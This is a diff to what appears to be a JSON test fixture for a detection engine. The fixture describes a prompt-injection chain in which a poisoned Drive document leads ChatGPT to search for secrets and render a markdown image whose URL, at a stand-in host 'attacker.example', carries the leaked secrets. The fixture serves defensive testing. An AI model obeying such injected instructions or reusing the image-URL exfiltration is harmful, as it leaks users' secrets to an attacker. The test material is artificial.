@@ -15,7 +15,7 @@
     "5. Results land in context; ChatGPT renders a markdown image whose URL embeds the secrets in the query string.",
     "6. The ChatGPT browser client auto-fetches the image URL: GET https://attacker.example/img.png?leak=<secrets>. The fetch IS the exfiltration."
   ],
-  "_lineage_notes": "Closure walks from the image fetch back through the chat response, the secret-search, and the original poisoned doc. The Drive source is mixed-source-pii (per discovery.rs:2524-27); when combined with the external image fetch destination, the engine fires sensitive-retrieval-egress at minimum, and cross-zone-composition if the URL-injection signal is observed in the doc body.",
+  "_lineage_notes": "Observable sequence: a Drive document influences a secret search and a response containing an external image request. Expected public result: Red on the outbound image request.",
   "resourceSpans": [
     {
       "resource": {
